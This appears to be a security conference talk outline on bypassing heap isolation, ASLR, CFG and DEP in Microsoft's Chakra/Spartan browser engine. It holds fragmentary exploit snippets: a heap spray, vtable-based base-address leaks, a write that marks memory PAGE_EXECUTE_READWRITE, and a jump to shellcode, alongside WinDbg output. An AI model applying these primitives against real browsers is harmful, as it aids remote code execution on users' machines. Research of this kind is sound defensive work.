### Exploit Bypass Techniques

#### 1. HeapSpray
- **Description**: A technique used to fill the heap with a large amount of data, typically shellcode, to increase the likelihood of successful exploitation.
- **Example**:
  ```javascript
  function heap_spray(num) {
      var array_1 = new Array();
      var array_1_size = 0x1000 * num;
      for (var i = 0; i < array_1_size; i++) {
          array_1[i] = "A";
      }
  }
  ```

#### 2. Memory Read/Write
- **Description**: Techniques to read from and write to memory, often used to manipulate program state or inject shellcode.
- **Example**:
  ```javascript
  0:024> dd 11110100
  11110100  562853c4 063b75c0 00000000 00010005
  11110110  7fffffff 00000000 11110124 11110124
  11110120  05a25ae0 00000000 7fffffff 7fffffff
  11110130  00000000 0c0c0c0c 0c0c0c0c 0c0c0c0c
  11110140  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
  11110150  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
  11110160  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
  11110170  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
  ```

#### 3. Bypass ASLR
- **Description**: Techniques to bypass Address Space Layout Randomization (ASLR), which randomizes the memory addresses used by system and application processes.
- **Example**:
  ```javascript
  var array_vft_address = read_dword(0x11110200);
  var chakra_base_addr = array_vft_address - 0x000653c4;
  ```

#### 4. Bypass CFG
- **Description**: Techniques to bypass Control Flow Guard (CFG), which is designed to prevent the execution of code at unexpected locations.
- **Example**:
  ```javascript
  // ecx = [object+0x04]
  ```

#### 5. Bypass DEP
- **Description**: Techniques to bypass Data Execution Prevention (DEP), which prevents the execution of code in non-executable memory regions.
- **Example**:
  ```c
  void __thiscall Memory::SmallHeapBlockT::ClearPageHeapState() {
      int flOldProtect = 0;
      if (this->address) {
          VirtualProtect(this->address, 0x1000, this->protect, &flOldProtect);
      }
  }

  struct Memory::SmallHeapBlockT {
      DWORD protect; // +0x14
      void *address; // +0x18
  }
  ```

  ```javascript
  write_dword(old_ecx_struct + 0x18, shell_code_address);
  write_dword(old_ecx_struct + 0x14, 0x40); // read+write+execute
  ```

  ```assembly
  0:025> u poi(0618b150)
  chakra!Js::LiteralString::`vftable':
  0:025> !address poi(0618b150+8)
  Usage:                   
  Base Address:           08450000 
  End Address:            08451000 
  Region Size:            00001000 (   4.000 kB) 
  State:                  00001000          MEM_COMMIT 
  Protect:                00000040          PAGE_EXECUTE_READWRITE 
  Type:                   00020000          MEM_PRIVATE 
  Allocation Base:        08450000 
  Allocation Protect:     00000004          PAGE_READWRITE
  ```

#### 6. Execute ShellCode
- **Description**: Techniques to execute arbitrary code (shellcode) within the target process.
- **Example**:
  ```javascript
  write_dword(test2_function_addr, shell_code_address);
  ```

### Spartan 0day & Exploit

#### 1. Isolation Heap
- **Description**: Techniques to bypass heap isolation mechanisms.

#### 2. Memory Protection
- **Description**: Techniques to bypass memory protection mechanisms.

#### 3. Spartan Memory Management
- **Description**: Techniques related to managing memory in the Spartan browser engine.

#### 4. CFG
- **Description**: Techniques to bypass Control Flow Guard in the Spartan browser engine.

#### 5. Exploit Bypass All
- **Description**: General techniques to bypass various security mechanisms.

#### 6. 0day
- **Description**: Details about a specific 0day vulnerability.

#### 7. Q&A
- **Description**: Questions and answers related to the exploit and bypass techniques.

### Contact Information
- **Twitter & Weibo**: @exp-sky
- **Blog**: http://exp-sky.org
- **Email**: PI:EMAIL

Thank you!